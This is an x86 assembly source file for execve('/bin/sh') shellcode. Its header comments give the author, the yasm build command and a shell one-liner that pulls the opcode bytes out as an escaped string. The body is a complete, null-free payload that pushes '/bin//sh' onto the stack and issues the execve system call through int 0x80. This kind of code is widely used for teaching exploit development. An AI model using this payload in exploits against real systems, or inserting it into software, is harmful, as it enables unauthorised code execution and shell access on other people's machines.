; Author: Abhinav Thakur
; Email : compilepeace@gmail.com
; Description : An execve '/bin/sh' spawning shellcode

; Compile : yasm -f bin ./shell.asm
; Harness : for i in $(objdump -d ./shell.o | grep "^ " | cut -f2);do echo -n \\x$i; done
; x86 system calling convention : eax (syscall number) | ebx ecx edx esi edi ebp
; x86-64 sys calling convention : rax (syscall number) | rdi rsi rdx rcx r8  r9 

%define SYS_EXECVE  0x0b

segment .text
global _start

_start:

    ; int execve (const char *pathname, char *const argv[], char *const envp[])
    xor eax, eax
    push eax                ; push NULL on stack
    push 0x68732f2f         ; "//sh"
    push 0x6e69622f         ; "/bin"
    mov ebx, esp            ; pathname = "/bin//sh\x00"
    
    push eax                ; stack --> \x00\x00\x00\x00 | "/bin//sh" | "\x00\x00\x00\x00"
    mov edx, esp            ; edx   --> "\x00\x00\x00\x00"
    push ebx                ; stack --> &("/bin//sh") | 0 | "/bin//sh" | 0 
    mov ecx, esp
    mov al, SYS_EXECVE      ; syscall number        
    int 0x80

 